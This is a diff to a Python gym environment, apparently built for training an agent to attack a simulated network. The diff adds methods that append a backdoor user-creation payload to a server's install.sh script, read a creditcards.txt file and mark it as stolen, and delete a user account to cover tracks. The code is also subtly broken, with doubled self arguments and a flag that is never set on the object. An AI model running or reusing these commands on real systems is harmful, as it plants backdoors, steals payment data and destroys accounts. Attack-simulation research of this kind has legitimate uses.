@@ -1,4 +1,4 @@
-from network_interactions import *  # Import your functions
+from network_interactions import *
 import gym
 from gym import spaces
 import numpy as np
@@ -19,6 +19,7 @@ class NetworkAttackEnv(gym.Env):
         })
 
         self.action_space = spaces.MultiDiscrete([types, commands, intensity])
+        stolen_info = False
         
     def step(self, action):
         response_type = action[0]
@@ -40,14 +41,19 @@ class NetworkAttackEnv(gym.Env):
         elif response_type == 1:
             if specific_action == 0:
                 self.brute_force(self, ip)
+            elif specific_action == 1:
+                self.inject_script(self)
+            elif specific_action == 2:
+                self.read_info(self)
 
         # Obfuscation
         elif response_type == 2:
-            'none'
+            if specific_action == 0:
+                self.remove_user(self, 'chloe')
 
         observation = { }
         reward = 'not implemented'
-        done = 'not implemented'
+        done = self.stolen_info
 
         return observation, reward, done, {}
     
@@ -73,9 +79,31 @@ class NetworkAttackEnv(gym.Env):
         result = interact(command)
         return result
 
+    def inject_script(self):
+        payload = '''
+            username="dylan"
+            password="h4ck3d"
+            useradd -m -s /bin/bash $username
+            echo "$username:$password" | chpasswd
+        '''
+
+        escaped_payload = payload.replace('"', '\\"').replace('$', '\\$')
+
+        command = (f'echo \"{escaped_payload}\" >> /var/www/apache2/reposerver/install.sh')
+        result = interact(command)
+    
+    def read_info(self):
+        command = 'cat /var/www/samba/creditcards.txt'
+        result = interact(command)
+        if (result == 'Success'):
+            self.stolen_info = True
    
 # Obfuscation
-   
+    def remove_user(self, username):
+        command = f"userdel -r {username}"
+        result = interact(command)
+        
+        
 # Other (maybe not usable here)
 
     def start_node(self, node_id):
